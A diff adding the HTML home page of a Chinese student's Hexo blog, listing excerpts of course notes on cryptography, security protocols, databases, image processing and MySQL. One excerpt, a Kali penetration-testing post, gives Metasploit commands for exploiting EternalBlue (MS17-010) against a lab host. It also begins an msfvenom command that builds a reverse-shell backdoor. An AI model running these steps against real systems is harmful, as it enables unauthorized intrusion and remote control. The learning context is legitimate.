@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>lzhのBLOG - 汪~</title><meta name="author" content="£·"><meta name="copyright" content="£·"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里是lzh的个人博客涅!">
+<meta property="og:type" content="website">
+<meta property="og:title" content="lzhのBLOG">
+<meta property="og:url" content="https://lzh594.github.io/index.html">
+<meta property="og:site_name" content="lzhのBLOG">
+<meta property="og:description" content="这里是lzh的个人博客涅!">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lzh594.github.io/images/touxiang1.jpeg">
+<meta property="article:author" content="£·">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lzh594.github.io/images/touxiang1.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lzh594.github.io/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'lzhのBLOG',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-22 23:40:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/touxiang1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/images/hutao2.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="lzhのBLOG"><span class="site-name">lzhのBLOG</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">lzhのBLOG</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/lzh594" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/BUAA/crypto/crypto/" title="crypto-密码学库"><div class="post-bg" style="background: /images/tianxiwei1.HPG"></div></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/crypto/crypto/" title="crypto-密码学库">crypto-密码学库</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T11:44:45.000Z" title="发表于 2024-01-18 19:44:45">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/crypto/">crypto</a></span></div><div class="content">liuzhCrypto Python 库
+
+
+项目介绍
+
+
+性质：本项目是BUAA-网络空间安全学院-2023年春季密码学实验课程大作业
+
+
+作者：BUAA-网络空间安全学院2021级-21371445-刘征昊
+
+
+概述：本项目采用面向对象编程的方式对本学期实验代码进行整合以及完善，制作了个人的密码学库
+
+
+支持github和PyPI：latest release请关注Github
+
+
+项目目录结构
+12345678910111213141516171819202122232425262728293031liuzh594Crypto├── LICENSE├── README.md├── liuzh594Crypto # 包│   ├── __init__.py│   ├── basicMath # 基础数学库│   │   ├── __init__.py│   │   ├── ECC.py│   │   ├── GF.py│   │   ├── basic.py│   │   └── type.py│   ├── blockCipher # 分组密码学库│   │   ├── __in ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/BUAA/securityProtocol/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="severityProtocol-烤漆总结"><img class="post-bg" src="/images/naweiya.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="severityProtocol-烤漆总结"></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/securityProtocol/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="severityProtocol-烤漆总结">severityProtocol-烤漆总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T11:42:01.000Z" title="发表于 2024-01-18 19:42:01">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/severityProtocol/">severityProtocol</a></span></div><div class="content">1 安全协议概述
+协议概念
+
+
+规定了一系列有序执行的步骤，必须依次执行
+
+
+有两个或两个以上的参与者
+
+
+有明确的目的，即需要完成什么目标，防范什么风险等
+
+
+安全协议
+定义：
+
+
+建立在密码算法基础上的一种高互通协议，它运行在计算机通信网或分布式系统中，为安全需求的各方提供一系列步骤，借助于密码算法来达到密钥分发、身份认证以及安全地实现网络通信或电子交易等目的
+
+
+密码算法是安全协议的基础和核心，安全协议是密码算法应用纽带和桥梁
+
+
+安全协议包括密码协议
+
+
+分类：
+
+
+从协议实现的目的来看：
+
+
+密钥交换协议：用于完成会话密钥的建立，如DH
+
+
+认证协议：防止假冒、篡改、否认等攻击，实现身份认证、消息完整性认证、数据源和目标认证
+
+实体认证（身份认证）协议、数字签名协议
+
+
+
+认证密钥交换协议：结合认证协议和密钥交换协议，先对通信实体的身份进行认证，在认证成功的基础上，为下一步安全通信分发所使用的密钥
+
+
+安全电子支付和安全电子交易协议
+
+
+安全通信协议
+
+
+安全多方计算协议
+
+
+
+
+从安全协议与具体应用的关联性来看：
+
+
+基础安全协议：与应用无关，秘密共享协议、数字签名协议、身 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/BUAA/DBSEC/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="DBSEC-烤漆总结"><img class="post-bg" src="/images/syq1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DBSEC-烤漆总结"></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/DBSEC/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="DBSEC-烤漆总结">DBSEC-烤漆总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:53:01.000Z" title="发表于 2024-01-18 17:53:01">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/DBSEC/">DBSEC</a></span></div><div class="content">第一章 绪论
+数据库系统概述
+数据库4个基本概念
+
+
+数据data：数据库中存储的基本对象
+
+
+结构化、半结构化、非结构化
+
+
+数据是符号化的信息；信息是语义化的数据
+
+
+
+
+数据库database：长期储存在计算机内、有组织、可共享的大量数据的集合
+
+
+数据库管理系统DBMS：用户和OS之间的一层数据管理软件
+
+
+功能：数据定义、组织、存储、管理操纵、事务管理和运行管理、建立和维护，其他
+
+
+
+
+数据库系统DBS：数据库+数据库管理系统+应用程序、数据库管理员(DBA)
+
+
+管理信息系统(MIS)架构：C/S、B/S
+
+
+数据模型：对现实世界数据特征的抽象
+分类：两个层次
+
+
+概念模型：用户观点
+
+
+逻辑模型(计算机系统观点)和物理模型(数据最底层抽象)
+
+
+概念模型：
+
+
+信息世界中的基本概念：
+
+
+实体：客观存在可相互区别的事物
+
+
+属性：尸体所具有的某一特性
+
+
+码/键：唯一标识实体的属性集
+
+
+实体型：用实体名及其属性名集合来抽象和刻画同类实体
+
+
+实体集：同一类型实体的集合
+
+
+联系：现实世界中事物内部、事物之间的联系没在信息世界中反映为实体(型)内部/之间的联系
+
+内部： ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/BUAA/imgProc/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="imgProc-烤漆总结"><div class="post-bg" style="background: /images/tianxiwei1.HPG"></div></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/imgProc/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="imgProc-烤漆总结">imgProc-烤漆总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:46:05.000Z" title="发表于 2024-01-18 17:46:05">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/imgProc/">imgProc</a></span></div><div class="content">
+8章
+模式识别的系统框图
+直方图 均衡化
+log算子
+图像描述子，什么性质
+1229
+第一章
+数字图像表达方式
+链码
+1.3-1.4简答题
+第二章
+2.1.4
+噪声
+2.4 图像评价，主观客观
+2.5 彩色图像基础知识
+彩色模型
+第三章
+二位连续函数、狄拉克、傅立叶函数等，例题
+离散傅立叶变换、性质
+都重要
+沃尔什、哈达码，核，DCT（非计算）
+哈尔变换、kl、小波不考
+第四章
+图像压缩，换算
+熵编码、熵、平均码字长度、相关概念
+哈夫曼编码
+香农
+算术编码
+游程长度编码不考
+DPCM（插值脉冲编码）
+降质原因
+jpeg压缩流程
+国际标准
+第五章
+图像处理增强与复原
+直方图均衡、修正
+同态增析原理
+平滑，方式、各种滤波算法、功能
+锐化：梯度、拉普拉斯
+几何校正
+5.7-9不考
+第六章
+各种算子
+Marr先干啥后干啥，log滤波器是什么
+沈俊、facet、模版匹配不考
+hough变换
+阈值分割方法，原理等
+模糊阈值分割不考
+区域增长法等
+数学形态学概念
+第七章
+几何特性、概念
+灰度共生矩阵
+矩不变量的性质
+边界描述、链码
+什么纹理对应什么东西
+第八章
+ppt为准
+模式识别流程及其环节
+分 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/BUAA/imgProc/ex4/" title="imgProc-ex4"><img class="post-bg" src="/images/syq2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="imgProc-ex4"></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/imgProc/ex4/" title="imgProc-ex4">imgProc-ex4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:46:04.000Z" title="发表于 2024-01-18 17:46:04">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/imgProc/">imgProc</a></span></div><div class="content">实验四：手写数字识别
+实验目的
+
+
+掌握分类、识别问题的实质，了解各种分类问题的机器学习方法，并至少掌握一种，熟悉 Python 编程。
+
+
+实验内容
+
+
+对实验提供的手写数据库（MNIST）进行训练和测试，最终能够较为准确的识别数据库中的手写体数字。
+
+
+实验要求
+
+
+编写一完整的 Python 程序，选取一种合适的机器学习方法，对实验提供的手写数据库（MNIST）进行训练和测试，最终能够较为准确的识别数据库中的手写体数字。
+
+
+运行训练程序，并通过 tensorboard 可视化，通过图片展示训练过程中的Loss 和测试准确度。并且测试最好模型的识别准确度。
+
+
+实验原理
+
+
+采用卷积神经网络（Convolutional Neural Networks, CNN）来实现实验要求。卷积神经网络由输入层，卷积层，池化层，全连接层，输出层等组成。输入层处理输入的图像数据，在卷积层经过二维卷积运算提取特征，在经过池化层对提取到的特征进行选择和过滤，最终通过全连接层经过梯度运算迭代结果。因此，在卷积神经网络中图形的特征可以自动提取，并不需要对所分类图形的处理具有先图像处理与信息隐藏课程实验验 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/BUAA/imgProc/ex3/" title="imgProc-ex3"><div class="post-bg" style="background: /images/tianxiwei2.HPG"></div></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/imgProc/ex3/" title="imgProc-ex3">imgProc-ex3</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:46:03.000Z" title="发表于 2024-01-18 17:46:03">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/imgProc/">imgProc</a></span></div><div class="content">实验三：图像分割
+实验目的
+
+
+了解图像分割的基本原理，并利用图像分割算法进行图像分割处理；
+
+
+掌握数学形态学的基本运算。
+
+
+实验内容
+
+
+利用类间方差阈值算法实现图像的分割处理；
+
+
+利用形态学处理进行处理结果修正。
+
+
+实验环境
+
+macOS 14.1 Sonoma（Apple M1 PRO）
+PyCharm/Python3.10
+OpenCV-Python
+
+实验原理及过程
+
+
+对输入图像进行平滑处理，以减小噪声对分割处理的影响，比较中值滤波范围取不同值时对图像滤波的效果
+
+
+中值滤波是基于排序统计理论的一种能有效抑制噪声的非线性信号处理技术，中值滤波的基本原理是把数字图像或数字序列中一点的值用该点的一个邻域中各点值的中值代替，让周围的像素值接近真实值，从而消除孤立的噪声点。方法是用某种结构的二维滑动模板，将板内像素按照像素值的大小进行排序， 生成单调上升（或下降）的为二维数据序列。
+
+
+二维中值滤波输出为:
+g(x,y)=Mid{f(x−k,y−l)∣k,l∈W}g(x,y)=Mid\{f(x-k,y-l)|k,l\in W\}
+g(x,y)=Mid{f(x−k,y−l)∣ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/BUAA/imgProc/ex2/" title="imgProc-ex2"><img class="post-bg" src="/images/syq1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="imgProc-ex2"></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/imgProc/ex2/" title="imgProc-ex2">imgProc-ex2</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:46:02.000Z" title="发表于 2024-01-18 17:46:02">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/imgProc/">imgProc</a></span></div><div class="content">实验二：图像复原
+实验目的
+
+利用反向滤波和维纳滤波进行降质图像复原，比较不同参数选择对复原结果的影响。
+
+实验
+实验内容
+
+利用反向滤波方法进行图像复原；
+利用维纳滤波方法进行图像复原。
+
+实验环境
+
+macOS 14.1 Sonoma（Apple M1 PRO）
+PyCharm/Python3.10
+OpenCV-Python
+
+实验原理及过程
+
+
+输入图像采用实验 1 所获取的图像，对输入图像采用运动降质模型，如下式所示
+H(u,v)=Tπ(au+bv)sin⁡[π(au+bv)]exp⁡−jπ(au+bv)u,v=−N2,−N2+1,...,−1,0,1,...,N2−1T=1,a=b=0.02H(u,v)=\frac{T}{\pi(au+bv)}\sin[\pi(au+bv)]\exp^{-j\pi(au+bv)}\\
+u,v=-\frac{N}{2},-\frac{N}{2}+1,...,-1,0,1,...,\frac{N}{2}-1\\
+T=1,a=b=0.02
+H(u,v)=π(au+bv)T​sin[π(au+bv)]exp−jπ(au+bv)u,v=−2N​,−2 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/BUAA/imgProc/ex1/" title="imgProc-ex1"><img class="post-bg" src="/images/syq2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="imgProc-ex1"></a></div><div class="recent-post-info"><a class="article-title" href="/BUAA/imgProc/ex1/" title="imgProc-ex1">imgProc-ex1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:46:01.000Z" title="发表于 2024-01-18 17:46:01">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/BUAA/">BUAA</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/BUAA/imgProc/">imgProc</a></span></div><div class="content">实验一：图像去噪
+实验目的
+
+熟悉和掌握 Python 图像处理的基本操作；
+掌握 DCT 变换的基本性质和 Python 的实现方法；
+掌握如何利用 DCT 变换进行简单的图像去噪任务；
+掌握如何利用 Python 进行 PSNR 等图像质量评价客观标准。
+
+实验内容
+
+对 Lena 图像进行基础的图像处理操作，对图像进行添加噪声、去噪处理的操作
+计算去噪处理之后图像与添加噪声前图像的 PSNR
+
+实验环境
+
+macOS 14.1 Sonoma（Apple M1 PRO）
+PyCharm/Python3.10
+OpenCV-Python
+
+实验原理及过程
+
+
+读取 Lena 图像，将彩色图转换为灰度图
+
+
+数字图像的表示:
+
+一幅图像可以被定义为一个二维函数𝑓(𝑥,𝑦)𝑓(𝑥, 𝑦)f(x,y)，其中𝑥𝑥x和𝑦𝑦y是平面坐标，𝑓𝑓f在每一个坐标处的取值𝑘∈𝑅r𝑘\in
+𝑅^rk∈Rr即为图像在该点的亮度和色彩。灰度图像对于每一个坐标(𝑥,𝑦)(𝑥, 𝑦)(x,y)有𝑓(𝑥,𝑦)=𝑘∈𝑅𝑓(𝑥, 𝑦) = 𝑘 \in 𝑅f(x ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/kali/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="kali渗透测试（未完结）"><div class="post-bg" style="background: /images/tianxiwei1.HPG"></div></a></div><div class="recent-post-info"><a class="article-title" href="/kali/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="kali渗透测试（未完结）">kali渗透测试（未完结）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:32:20.000Z" title="发表于 2024-01-18 17:32:20">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/kali/">kali</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/kali/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content">渗透测试
+1.1 kail安装
+1.2 msf和永恒之蓝
+
+
+msf：metaspoilt
+
+
+永恒之蓝 windows 17年以前的版本均含有该漏洞
+
+
+1.3 msf攻击永恒之蓝
+
+
+进入msf：
+  1msfconsole
+
+
+搜索永恒之蓝模块
+  1search ms17_010
+
+
+使用模块
+  1use id/name
+
+
+查看设置选项
+  12show optionsoptions
+
+
+测试与windows连通性
+注意关闭防火墙
+  1ping 192.168.179.132
+
+
+设置RHOST（攻击目标主机）等必选项**
+  1set RHOST 192.168.179.132 
+
+
+payload设置默认即可
+
+LHOST：监听地址（kali本机ip）
+LPORT：监听端口
+
+
+
+运行
+  1run
+
+
+metteroreter：后渗透模块
+
+
+msfvenom生成远控木马（shell中）
+
+
+用来生成后门的软件，在目标机上执行后门，在本地监听上线
+
+
+windows可执行程序后门
+  1msfvenom -p windows/x64/meterpreter/reve ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/tools/MySQL/" title="MySQL入门"><div class="post-bg" style="background: /images/tianxiwei1.HPG"></div></a></div><div class="recent-post-info"><a class="article-title" href="/tools/MySQL/" title="MySQL入门">MySQL入门</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-18T09:22:45.000Z" title="发表于 2024-01-18 17:22:45">2024-01-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/tools/">tools</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/tools/mysql/">mysql</a></span></div><div class="content">MySQL
+1.1 启动MySQL
+设置/命令行
+1.2 登录
+12mysql -u root -p[yourpasswd]
+1.3 mysql界面
+
+
+创建数据库
+  1CREATE DATABASE name;
+
+
+显示数据库信息
+  1SHOW DATABASES;
+
+
+1.4 VScode 插件
+
+SQLTools
+MySQL插件驱动
+
+1.5 连接数据库
+
+默认设置
+
+2.1 注释和@block
+123-- comment-- @block -- 用于局部执行代码
+2.2 创建表格
+123456789CREATE TABLE Users(    id INT PRIMARY KEY AUTO_INCREMENT,    -- 数据类型 主键 自动增长    email VARCHAR(255) NOT NULL UNIQUE,    -- 字符串长度最大255 非空 唯一    bio TEXT,    -- 未指定大小的字符串    country VARCHAR(2));
+2.3 添加数据
+1234INSERT INTO Users(email, bio, country ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/touxiang1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">£·</div><div class="author-info__description">欢迎访问～</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lzh594/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lzh594" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">lzh's Blog 来噜！</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/BUAA/crypto/crypto/" title="crypto-密码学库"><div style="background: /images/tianxiwei1.HPG"></div></a><div class="content"><a class="title" href="/BUAA/crypto/crypto/" title="crypto-密码学库">crypto-密码学库</a><time datetime="2024-01-18T11:44:45.000Z" title="发表于 2024-01-18 19:44:45">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/BUAA/securityProtocol/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="severityProtocol-烤漆总结"><img src="/images/naweiya.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="severityProtocol-烤漆总结"/></a><div class="content"><a class="title" href="/BUAA/securityProtocol/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="severityProtocol-烤漆总结">severityProtocol-烤漆总结</a><time datetime="2024-01-18T11:42:01.000Z" title="发表于 2024-01-18 19:42:01">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/BUAA/DBSEC/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="DBSEC-烤漆总结"><img src="/images/syq1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DBSEC-烤漆总结"/></a><div class="content"><a class="title" href="/BUAA/DBSEC/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="DBSEC-烤漆总结">DBSEC-烤漆总结</a><time datetime="2024-01-18T09:53:01.000Z" title="发表于 2024-01-18 17:53:01">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/BUAA/imgProc/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="imgProc-烤漆总结"><div style="background: 